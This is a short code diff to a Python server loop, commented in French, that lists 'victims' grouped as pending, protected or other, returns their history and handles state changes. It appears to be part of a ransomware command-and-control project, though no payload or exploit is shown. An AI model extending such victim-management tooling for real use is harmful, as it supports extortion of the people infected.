@@ -8,14 +8,23 @@ socket = net.start_net_serv_client()
 while True:
     # Reception d'un message
     recv_data = net.receive_message(socket)
+    print(recv_data)
     # Vérification de l'identité du message
     message_type = message.get_message_type(recv_data)
 
     if message_type == 'LIST_VICTIM_REQ':
         # execution de la fonction get_victim_list() pour plus d'informations -> voir data.py
-        result = data.get_victim_list()
+        result_pending, result_protected, result_other = data.get_victim_list()
         # Pour chaque victime, l'envoie vers le client
-        for victim in result:
+        for victim in result_pending:
+            list_victim_resp = message.set_message("LIST_VICTIM_RESP", victim)
+            net.send_message(socket, list_victim_resp)
+
+        for victim in result_protected:
+            list_victim_resp = message.set_message("LIST_VICTIM_RESP", victim)
+            net.send_message(socket, list_victim_resp)
+
+        for victim in result_other:
             list_victim_resp = message.set_message("LIST_VICTIM_RESP", victim)
             net.send_message(socket, list_victim_resp)
 
@@ -29,7 +38,10 @@ while True:
         result = data.get_history(recv_data)
         # Envoi du résultat
         net.send_message(socket, message.set_message('HISTORY_RESP', result[0]))
-        net.send_message(socket, message.set_message('HISTORY_END', recv_data['HIST_REQ']))
+        packet = message.set_message('HISTORY_END', [recv_data['HIST_REQ']])
+        print(packet)
+        net.send_message(socket, packet)
+
 
 
     elif message_type == 'CHANGE_STATE':
